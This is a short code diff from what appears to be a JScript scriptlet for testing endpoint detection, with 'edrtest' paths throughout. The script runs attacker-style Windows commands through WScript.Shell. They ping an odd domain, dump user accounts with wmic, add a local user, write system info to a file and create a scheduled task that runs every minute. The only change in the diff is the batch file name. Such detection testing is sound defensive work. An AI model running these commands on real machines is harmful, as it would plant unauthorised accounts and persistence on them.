@@ -12,7 +12,7 @@ var r = new ActiveXObject("WScript.Shell").Run("ping misdepatrment.com -i 1");
 var r = new ActiveXObject("WScript.Shell").Run("wmic useraccount get /ALL");
 var r = new ActiveXObject("WScript.Shell").Run("net user /add sh123");
 var r = new ActiveXObject("WScript.Shell").Run("cmd /c systeminfo > c:\\edrtest\\systeminfo.txt");
-var r = new ActiveXObject("WScript.Shell").Run("cmd /c schtasks /create /tn edrtesttask1 /tr c:\\edrtest\\edrtest2.bat /sc minute");
+var r = new ActiveXObject("WScript.Shell").Run("cmd /c schtasks /create /tn edrtesttask1 /tr c:\\edrtest\\edrtest2-POV.bat /sc minute");
 ]]>
 </script>
 </registration>
